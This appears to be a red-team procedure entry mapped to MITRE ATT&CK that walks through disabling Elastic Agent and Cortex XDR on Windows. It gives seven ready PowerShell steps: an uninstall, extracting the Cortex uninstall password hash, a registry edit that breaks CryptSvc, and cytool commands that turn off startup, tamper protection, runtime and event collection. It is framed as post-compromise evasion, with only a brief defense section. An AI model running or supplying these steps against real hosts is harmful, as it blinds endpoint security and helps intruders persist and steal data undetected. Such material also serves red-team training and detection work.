---
id: 386cb069-7202-4af4-97ee-c0cf657fd64e
name: disable-elastic-agent-and-cortex-xdr-on-windows
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:27.644673+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - '[[techniques/Impair Defenses|T1562 - Impair Defenses]]'
  - >-
    [[techniques/Impair Defenses#T1562.001 - Disable or Modify Tools|T1562.001 -
    Disable or Modify Tools]]
sub_techniques: []
tags:
  - '[[tags/Antivirus Removal]]'
  - '[[tags/Disable Antivirus and Security]]'
  - '[[tags/Windows - Persistence]]'
commands:
  - '[[commands/elastic-agent-uninstall]]'
  - '[[commands/cortex-xdr-locate-password-hash]]'
  - '[[commands/disable-cortex-via-registry]]'
  - '[[commands/cytool-disable-startup]]'
  - '[[commands/cytool-disable-protection]]'
  - '[[commands/cytool-disable-runtime]]'
  - '[[commands/cytool-disable-event-collection]]'
platforms:
  - Windows
tools: []
validated: true
---

# disable-elastic-agent-and-cortex-xdr-on-windows

## Summary

This procedure disables and uninstalls Elastic Agent and Cortex XDR antivirus and security software on a Windows system, allowing an attacker to impair endpoint detection and response capabilities for evasion and persistence.

## Description

Elastic Agent and Cortex XDR are endpoint protection platforms that monitor system activity, collect events, and block malicious behavior. Disabling them involves uninstalling Elastic Agent directly and using built-in tools like cytool.exe for Cortex XDR to turn off runtime protection, event collection, and startup services, often requiring administrative privileges and sometimes a reboot. This technique is commonly used post-compromise to evade detection during lateral movement or data exfiltration in enterprise Windows environments. Note that some changes, like registry modifications, require a system reboot to take full effect, and tamper protection may need to be bypassed first.

## Requirements

1. Administrative privileges on the target Windows system (local or domain admin).
2. Local access to the system via console, RDP, or remote shell.
3. Knowledge of installation paths (default: C:\Program Files\Elastic\Agent for Elastic; C:\Program Files\Palo Alto Networks\Traps for Cortex XDR).
4. For Cortex XDR, the global uninstall password or hash if required for certain operations.

## Defense

- Deploy endpoint detection and response (EDR) solutions with tamper protection enabled and regular integrity checks.
- Monitor registry changes to critical services like CryptSvc and process executions of cytool.exe or elastic-agent.exe via Sysmon or EDR logs.
- Enforce least privilege access and use application whitelisting to prevent unauthorized uninstalls.
- Regularly audit installed security software and alert on uninstall attempts.

## Objectives

1. Uninstall Elastic Agent to remove its monitoring capabilities.
2. Disable Cortex XDR features including runtime protection, event collection, and startup persistence.
3. Impair overall system defenses to enable undetected persistence and lateral movement.

## Instructions

### Step 1: Uninstall Elastic Agent

**Context**: Navigate to the Elastic Agent installation directory and execute the uninstall command to remove the agent from the system. This stops all Elastic monitoring and requires confirmation.

**Command** ([[commands/elastic-agent-uninstall]]):
```powershell
cd "C:\Program Files\Elastic\Agent"
.\elastic-agent.exe uninstall
```

> Change to the installation directory using cd, then run the uninstaller. When prompted, confirm with 'Y' to proceed. This removes the agent files and stops its services.

### Step 2: Locate Cortex XDR Uninstall Password Hash

**Context**: For uninstalling or advanced disabling of Cortex XDR, retrieve the encrypted global uninstall password from the agent's persistence database to bypass protections if needed.

**Command** ([[commands/cortex-xdr-locate-password-hash]]):
```powershell
# Password hash location: C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db
# Search for PasswordHash, PasswordSalt, or similar strings in the file.
Get-Content "C:\ProgramData\Cyvera\LocalSystem\Persistence\agent_settings.db" | Select-String -Pattern "PasswordHash|PasswordSalt|password,salt"
```

> This step identifies the location and extracts the hash strings from the database file. Use tools like strings.exe or a text editor to inspect if PowerShell is restricted. The default global password is often 'Password1', but hashes must be cracked offline if tampered.

### Step 3: Disable Cortex via Registry Modification

**Context**: Modify the CryptSvc registry to break Cortex XDR's service loading, effectively disabling it. A reboot is required for this to take effect.

**Command** ([[commands/disable-cortex-via-registry]]):
```powershell
reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CryptSvc\Parameters /t REG_EXPAND_SZ /v ServiceDll /d nothing.dll /f
```

> This replaces the ServiceDll value with a non-existent DLL ('nothing.dll'), preventing the service from loading properly. Verify with reg query before and after, and reboot the system to apply.

### Step 4: Disable Cortex Agent on Startup

**Context**: Prevent Cortex XDR from starting automatically on boot using the cytool utility, reducing persistence.

**Command** ([[commands/cytool-disable-startup]]):
```powershell
cytool.exe startup disable
```

> Run cytool to disable startup integration. This requires admin rights and may need a reboot to fully enforce. Success is indicated by no error and the agent not relaunching post-reboot.

### Step 5: Disable Protection on Cortex XDR

**Context**: Turn off tamper protection for files, processes, registry, and services to allow further modifications without interference.

**Command** ([[commands/cytool-disable-protection]]):
```powershell
cytool.exe protect disable
```

> This disables self-protection mechanisms. Confirm by attempting to delete agent files or modify registry without blocks. Reboot may be needed if protection persists.

### Step 6: Disable Cortex XDR Runtime

**Context**: Stop the core runtime engine of Cortex XDR, even if tamper protection is active, to halt real-time scanning and blocking.

**Command** ([[commands/cytool-disable-runtime]]):
```powershell
cytool.exe runtime disable
```

> Executes the runtime disable command. The agent should no longer perform behavioral analysis or file scans. Check task manager for cytool or Traps processes being inactive.

### Step 7: Disable Event Collection

**Context**: Prevent Cortex XDR from collecting and sending telemetry data to the management server, blinding remote monitoring.

**Command** ([[commands/cytool-disable-event-collection]]):
```powershell
cytool.exe event_collection disable
```

> Disables logging and event forwarding. Verify by checking local logs or network traffic for absence of uploads to Palo Alto servers.
